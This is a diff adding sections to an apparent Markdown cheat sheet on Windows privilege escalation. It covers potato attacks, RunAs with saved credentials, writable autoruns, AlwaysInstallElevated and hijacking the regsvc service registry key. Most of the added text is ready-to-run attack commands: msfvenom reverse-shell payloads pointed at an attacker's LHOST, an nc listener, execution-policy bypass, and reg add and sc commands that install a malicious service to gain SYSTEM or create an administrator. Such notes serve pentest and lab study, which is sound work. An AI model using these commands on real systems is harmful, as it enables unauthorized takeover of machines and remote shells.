@@ -118,8 +118,120 @@
   ```
 
 ## Impersonation and Potato Attacks
+  1. Check Privileges
+  ```cmd
+  whoami /priv
+  ```
+  2. Check for SeAssignPrimaryToken and SeImpersonate
+  3. Run the Potato Attack on the System
+  4. NT Authority\System
+
 ## RunAs
+  1. Identify stored credentials
+  ```cmd
+  cmdkey /list
+  ```
+  2. Run Runas.exe
+  ```cmd
+  C:\Windows\System32\runas.exe /user:<user from cmdkey /list> /savecred "<program to execute>"
+  ```
+  3. I recommend a shell such as:
+  ```bash
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+  ```
+  4. NT Authority\System!
+
 ## Registry
+### Autoruns
+#### Sysinternals Suite
+  1. Run autoruns64.exe. Check for a program that seems out of place
+  2. Run accesscheck64.exe. Check for output that "Everyone" has "FILE_ALL_ACCESS"
+  ```cmd
+  accesscheck64.exe -wvu "C:\Path\to\Autorun"
+  ```
+
+#### Powershell using PowerUp
+  1. Start Powershell and run PowerUp.ps1
+  ```cmd
+  powershell -ep bypass
+  . .\PowerUp.ps1
+  ```
+#### Exploiting Autoruns
+  1. Generate a msfvenom payload
+  ```bash
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > <autorun_program.exe>
+  ```
+  2. Start a listener
+  ```bash
+  nc -nvlp <PORT>
+  ```
+  3. NT Authority\System! 
+
+### AlwaysInstallElevated
+#### Checking Registries
+  1. Check the Registry and look for 0x1
+  ```cmd
+  reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+  ```
+  ```cmd
+  reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+  ```
+  2. Generate a msfvenom payload
+  ```bash
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > setup.msi
+  ```
+  3. Run the installer
+  4. NT Authority\System!
+
+#### Using PowerUp
+  1. Check for AlwaysInstallElevated
+  2. If present run
+  ```powershell
+  Write-userAddMSI
+  ```
+  3. Run the installer
+  4. Generate a new administrator
+  5. PROFIT!
+
+#### Using Metasploit
+  1. Run the module:
+  ```bash
+  use /exploit/windows/local/always_install_elevated
+  ```
+
+### regsvc ACL
+  1. start powershell
+  ```cmd
+  powershell -ep bypass
+  ```
+  2. Check for FullControl of a registry key
+  ```powershell
+  Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+  ```
+  3. Change line #15 in windows_service.c to a user you control
+  4. Save the file and compile it:
+  ```bash
+  x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+  ```
+  5. Copy the generated file to the target in the 'C:\Temp' Folder
+  6. Add the malicious service
+  ```cmd
+  reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+  ```
+  7. Start the malicious service
+  ```cmd
+  sc start regsvc
+  ```
+  8. Verify the user is in the local administrator group
+  ```cmd
+  net localgroup administrators
+  ```
+  9. PROFIT!
+
+
+
+
+
 ## Exe FIles
 ## Startup Application
 ## DLL Hijacking
